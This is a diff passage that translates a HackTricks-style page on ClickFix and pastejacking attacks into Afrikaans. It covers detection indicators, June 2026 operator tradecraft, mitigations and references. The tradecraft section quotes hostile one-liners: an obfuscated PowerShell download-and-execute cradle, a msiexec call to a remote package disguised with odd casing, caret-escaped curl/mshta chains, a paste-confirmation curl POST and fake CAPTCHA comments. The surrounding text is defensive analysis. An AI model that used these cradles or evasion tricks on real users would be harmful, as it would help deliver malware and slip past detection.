-- File/registry: skepping van tydelike `.ps1` onder `%TEMP%`, plus RunMRU-inskrywings wat hierdie een-liners bevat; blokkeer/waarsku oor signed-script LOLBAS (WScript/cscript/mshta) wat met eksterne URLs of obfuscated alias strings uitgevoer word.
+- Prosesafkoms: blaaier → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell cradles onmiddellik ná knipbordskrywings/Win+R.
+- Sleutelwoorde in die command line: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker-domeine, of rou IP `iex(irm ...)`-patrone.
+- Netwerk: uitgaande verbindings na CDN worker-hosts of blockchain RPC-endpunte vanaf script-hosts/PowerShell kort ná webblaai.
+- Lêer/register: skep van tydelike `.ps1` onder `%TEMP%`, plus RunMRU-inskrywings wat hierdie eenreëls bevat; blokkeer/waarsku oor signed-script LOLBAS (WScript/cscript/mshta) wat met eksterne URL’s of geobfuskeerde alias-stringe uitgevoer word.
 
-## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining
+## ClickFix tradecraft van Junie 2026: paste-telemetrie, vals verifikasiekommentare en LOLBin-ketting
 
-Onlangse Red Canary telemetry toon dat die stabiele indicator **nie een presiese command is nie**, maar die kombinasie van **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, en **immediate execution**.<sup>[[7]](#references)</sup>
+Onlangse Red Canary-telemetrie toon dat die stabiele aanduiding **nie een presiese opdrag is nie**, maar die kombinasie van **gebruikerondersteunde plak-en-uitvoer**, **vertroude interpreteerders/LOLBins**, **geobfuskeerde vlae**, **afstandverkryging**, en **onmiddellike uitvoering**.<sup>[[7]](#references)</sup>
 
-### Notable operator patterns
+### Opmerklike operateurpatrone
 
-- **Paste confirmation telemetry**: sommige payloads roep `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` aan vóór die werklike stage. Dit bevestig user interaction terwyl die venster kort en stil gehou word.
-- **Fake verification comments**: PowerShell one-liners kan strings soos `# Security check ✔️ I'm not a robot Verification ID: 138105` byvoeg sodat die command steeds CAPTCHA-verwant lyk nadat dit in Run / `cmd.exe` / PowerShell history geplak is.
-- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermy ’n statiese URL in die command line terwyl dit steeds in-memory download-and-execute uitvoer.
-- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` misbruik ongewone casing en Unicode-like characters in flags om brittle detections te omseil, terwyl dit steeds soos `msiexec.exe` lyk.
-- **Caret-escaped LOLBin chains**: `cmd.exe` kan keywords met `^` escapes verberg (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die nested shell minimized begin, attacker content met ’n benign extension soos `.pdf` stoor, en dit dan deur `mshta` uitvoer.<sup>[[7]](#references)</sup>
-## Mitigations
+- **Telemetrie vir plakbevestiging**: sommige payloads roep `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` aan voordat die werklike stadium begin. Dit bevestig gebruikersinteraksie terwyl die venster kort en stil gehou word.
+- **Vals verifikasiekommentare**: PowerShell-eenreëls kan stringe soos `# Security check ✔️ I'm not a robot Verification ID: 138105` byvoeg sodat die opdrag steeds CAPTCHA-verwant lyk nadat dit in Run / `cmd.exe` / PowerShell-geskiedenis geplak is.
+- **Dinamiese URL-herkonstruksie**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` vermy ’n statiese URL in die command line terwyl dit steeds aflaai-en-uitvoer in die geheue uitvoer.
+- **Gemaskerde installer-uitvoering**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` misbruik ongewone hoof-/kleinlettergebruik en Unicode-agtige karakters in vlae om swak detections te omseil, terwyl dit steeds soos `msiexec.exe` lyk.
+- **Caret-ge-escape LOLBin-kettings**: `cmd.exe` kan sleutelwoorde met `^`-escapes versteek (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), die geneste shell geminimaliseerd begin, aanvallerinhoud met ’n onskadelike uitbreiding soos `.pdf` stoor, en dit dan deur `mshta` uitvoer.<sup>[[7]](#references)</sup>
+## Versagtende maatreëls
 
-1. Browser hardening – deaktiveer clipboard write-access (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis user gesture.
-2. Security awareness – leer users om sensitiewe commands te *tik* of dit eers in ’n text editor te plak.
-3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitrary one-liners te blokkeer.
-4. Network controls – blokkeer uitgaande requests na bekende pastejacking- en malware C2-domains.
+1. Blaaierverharding – deaktiveer knipbord-skryftoegang (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis ’n gebruikersgebaar.
+2. Sekuriteitsbewustheid – leer gebruikers om sensitiewe opdragte te *tik* of dit eers in ’n teksredigeerder te plak.
+3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitrêre eenreëls te blokkeer.
+4. Netwerkkontroles – blokkeer uitgaande versoeke na bekende pastejacking- en malware-C2-domeine.
 
-## Related Tricks
+## Verwante truuks
 
-* **Discord Invite Hijacking** misbruik dikwels dieselfde ClickFix-benadering nadat users na ’n malicious server gelok is:
+* **Discord Invite Hijacking** misbruik dikwels dieselfde ClickFix-benadering nadat gebruikers na ’n kwaadwillige server gelok is:
 
 {{#ref}}
 discord-invite-hijacking.md
@@ -277,13 +275,12 @@ discord-invite-hijacking.md
 
 ## References
 
-- [1] [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
+- [1] [Die klik regstel: Voorkoming van die ClickFix-aanvalvektor](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
 - [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
-- [3] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
-- [4] [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
-- [5] [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
-- [6] [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
-- [7] [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
-- [8] [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
-
+- [3] [Check Point Research – Onder die Pure Curtain: Van RAT tot Builder tot Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
+- [4] [Die ClickFix-fabriek: Eerste blootstelling van IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
+- [5] [2025, die jaar van die Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [6] [Red Canary – Intelligensie-insigte: Februarie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
+- [7] [Red Canary – Intelligensie-insigte: Junie 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
+- [8] [Check Point Research – Van sterre tot Upvotes: Valse reputasie wat ’n Crypto Clipboard Hijacker aandryf](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
 {{#include ../../banners/hacktricks-training.md}}
